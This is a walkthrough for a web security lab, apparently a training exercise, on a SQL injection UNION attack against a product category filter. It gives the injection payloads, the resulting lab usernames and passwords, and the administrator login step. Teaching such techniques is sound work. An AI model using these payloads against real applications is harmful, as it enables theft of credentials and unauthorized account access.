# Lab: SQL injection UNION attack, retrieving multiple values in a single column

### Instructions

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

### Solution

We can begin by confirming that there are two columns:

```sql
/filter?category=Pets' union select null,null--
```

Next we can follow the lab instructions and concatenate the `username` and `password` columns, using an arbitrary separator symbol:

```sql
/filter?category=Pets' UNION SELECT null,username || ':' || password FROM users--
```

This returns 3 usernames and passwords:

```
wiener:oqtub0nqj97ljuvs2vfh
carlos:iw6fhi1s37yddac3mx7u
administrator:4vzpgiowd2sbi7569qqe
```

We can use the administrator password to login at `/login` and solve the lab.